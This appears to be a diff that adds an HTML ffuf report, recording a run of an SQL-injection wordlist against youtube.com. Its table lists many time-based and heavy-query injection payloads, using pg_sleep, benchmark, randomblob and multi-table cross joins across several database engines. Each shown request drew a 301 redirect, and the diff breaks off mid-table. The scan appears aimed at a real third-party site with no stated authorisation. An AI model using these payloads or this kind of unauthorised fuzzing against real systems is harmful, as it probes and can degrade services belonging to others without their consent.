@@ -1,0 +1,312 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1.0"
+    />
+    <title>FFUF Report - </title>
+
+    
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"
+	/>
+	<link 
+	  rel="stylesheet" 
+	  type="text/css" 
+	  href="https://cdn.datatables.net/1.10.20/css/jquery.dataTables.css"
+	/>
+  
+  </head>
+
+  <body>
+    <nav>
+      <div class="nav-wrapper">
+        <a href="#" class="brand-logo">FFUF</a>
+        <ul id="nav-mobile" class="right hide-on-med-and-down">
+        </ul>
+      </div>
+    </nav>
+
+    <main class="section no-pad-bot" id="index-banner">
+      <div class="container">
+        <br /><br />
+        <h1 class="header center ">FFUF Report</h1>
+        <div class="row center">
+
+		<pre>ffuf -w /var/www/wordlist/SQLi/ALL.txt -u https://youtube.com/FUZZ -of html -o /var/www/public/result-ffuf/youtube.com-3c2c8b977c4f4d24bb52bd7a6c2060c0</pre>
+		<pre>2023-11-14T19:29:34Z</pre>
+
+   <table id="ffufreport">
+        <thead>
+        <div style="display:none">
+|result_raw|StatusCode|Input|Position|ContentLength|ContentWords|ContentLines|
+        </div>
+          <tr>
+              <th>Status</th>
+              <th>FUZZ</th>
+
+			  <th>URL</th>
+			  <th>Redirect location</th>
+              <th>Position</th>
+              <th>Length</th>
+              <th>Words</th>
+              <th>Lines</th>
+			  <th>Resultfile</th>
+          </tr>
+        </thead>
+
+        <tbody>
+			
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#39;9999|https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)%7C%7C&#39;9999|36|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)%7C%7C&#39;9999</td><td>36</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999|https://youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999|https://www.youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999|6|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999</td></td><td>https://youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999</td><td>https://www.youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#39;9999</td><td>6</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#34;9999|https://youtube.com/9999&#34;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#34;9999|https://www.youtube.com/9999%22&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;%229999|25|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#34;9999</td></td><td>https://youtube.com/9999&#34;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#34;9999</td><td>https://www.youtube.com/9999%22&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;%229999</td><td>25</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#34;9999|https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)%7C%7C%229999|29|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)%7C%7C%229999</td><td>29</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#34;9999|https://youtube.com/9999&#34;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))%7C%7C%229999|13|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))%7C%7C%229999</td><td>13</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#39;9999|https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)%7C%7C&#39;9999|32|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)%7C%7C&#39;9999</td><td>32</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999|https://youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999|https://www.youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999|24|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999</td></td><td>https://youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999</td><td>https://www.youtube.com/9999&#39;&#43;(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;&#39;9999</td><td>24</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)|https://youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)|35|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)</td><td>35</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#34;0&#34;=&#34;9999|https://youtube.com/9999&#34;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#34;0&#34;=&#34;9999|https://www.youtube.com/9999%22&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;%220%22=%229999|21|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#34;0&#34;=&#34;9999</td></td><td>https://youtube.com/9999&#34;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#34;0&#34;=&#34;9999</td><td>https://www.youtube.com/9999%22&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;%220%22=%229999</td><td>21</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#34;9999|https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)%7C%7C%229999|33|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)%7C%7C%229999</td><td>33</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#39;9999|https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)%7C%7C&#39;9999|8|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)%7C%7C&#39;9999</td><td>8</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999|https://youtube.com/9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999|https://www.youtube.com/9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999|20|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999</td></td><td>https://youtube.com/9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999</td><td>https://www.youtube.com/9999&#39;&#43;or&#43;benchmark(15000000,md5(0x4e446b6e))&#43;or&#43;&#39;0&#39;=&#39;9999</td><td>20</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#39;9999|https://youtube.com/9999&#39;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))%7C%7C&#39;9999|12|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))%7C%7C&#39;9999</td><td>12</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#39;9999|https://youtube.com/9999&#39;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;99999999&#43;from&#43;pg_sleep(15))%7C%7C&#39;9999|40|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;99999999&#43;from&#43;pg_sleep(15))%7C%7C&#39;9999</td><td>40</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)|https://youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)|27|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)</td><td>27</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)|https://youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)|2|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)</td><td>2</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#39;9999|https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)%7C%7C&#39;9999|28|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)%7C%7C&#39;9999</td><td>28</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test|https://youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test|https://www.youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test|10|0|1|1|
+                </div>
